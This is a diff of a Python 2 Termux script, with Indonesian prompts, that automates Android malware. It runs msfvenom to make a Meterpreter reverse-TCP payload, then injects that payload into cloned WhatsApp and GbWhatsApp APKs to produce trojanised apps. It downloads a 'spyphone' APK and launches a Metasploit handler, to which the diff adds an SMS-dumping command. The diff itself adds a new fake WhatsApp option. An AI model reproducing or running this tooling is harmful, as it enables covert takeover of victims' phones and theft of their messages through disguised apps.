@@ -21,7 +21,7 @@ end= '\033[0m'
 
 
 def out():
-	os.system("exit")
+	exit()
 
 os.system("clear")
 confirm =raw_input(putih+'Sudah mempunyai akun Portmap.io? y/n : ')
@@ -34,7 +34,7 @@ else :
     print '' 
     os.system('termux-open https://portmap.io')
     time.sleep(1)
-    out()
+    exit()
   else :
     if confirm== ' ':
       os.system('python2 msfgaf.py')
@@ -54,10 +54,11 @@ else :
 			time.sleep(2)
 			os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
 		else :
-			print 'Konfirmasi Salah!'
-			time.sleep(4)
 			os.system('clear')
-			out()
+			print 'Konfirmasi Salah!'
+			time.sleep(3)
+			os.system('clear')
+			exit()
       
 
 
@@ -86,9 +87,10 @@ def payload():
 		print 'Harus Diisi'
 	else :
 		print ' '
-	print hijau+'PLEASE WAIT ...'
+	print hijau+'PLEASE WAIT 5 - 20 Minutes...' 
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
 	
+
 def gbwa():
 	os.system("cd Malware && rm -rf payload.apk payload A")
 	os.system("git clone http://github.com/PyRAT-svg/GbWhatsApp &&mv -f GbWhatsApp Malware/A")
@@ -102,6 +104,18 @@ def gbwa():
 	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 	
 		
+def wa():
+	os.system("cd Malware && rm -rf payload.apk payload A")
+	os.system("git clone http://github.com/PyRAT-svg/WhatsApp &&mv -f WhatsApp Malware/A")
+	payload()
+	os.system("cd Malware && apktool d payload.apk -o payload")
+	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/com/metasploit/stage")
+	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/com/metasploit")
+	os.system("cd Malware && apktool b A -o WhatsApp.apk")
+	os.system("cd Malware && rm -rf payload.apk payload A")
+	os.system('mv -f Malware/WhatsApp.apk /storage/emulated/0/')
+	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+
 
 def spyphone_V14():
 	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
@@ -153,17 +167,22 @@ def pilmal():
 				if zedd == '3':
 					gbwa()
 				else :
-					print '\x1b[1;91m[!] Pilih 1-2'
-					os.system('clear')
-					awal()
-            
+					if zedd == '4':
+						wa()
+					else :
+						print '\x1b[1;91m[!] Pilih 1-2'
+						os.system('clear')
+						awal()
+						
+        
 def malware():
     os.system('clear')
     logo()
     os.system('figlet Malware |lolcat')
     print '\x1b[1;91m1.\x1b[1;97mSpyphone'
-    print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'+cyan+' *New'
+    print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
     print '\x1b[1;91m3.\x1b[1;97mGbWhatsApp'+cyan+' *New '
+    print '\x1b[1;91m4.\x1b[1;97mWhatsApp'+cyan+' *New '
     print '\r\x1b[1;91m__________________________________________«Back» '
     
         	
@@ -218,7 +237,7 @@ def remote():
       remote()
     else :
       os.system("clear")
-      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit;'");
+      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit -t dump_sms; sessions -k 1-5'");
       raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
       home() 
 
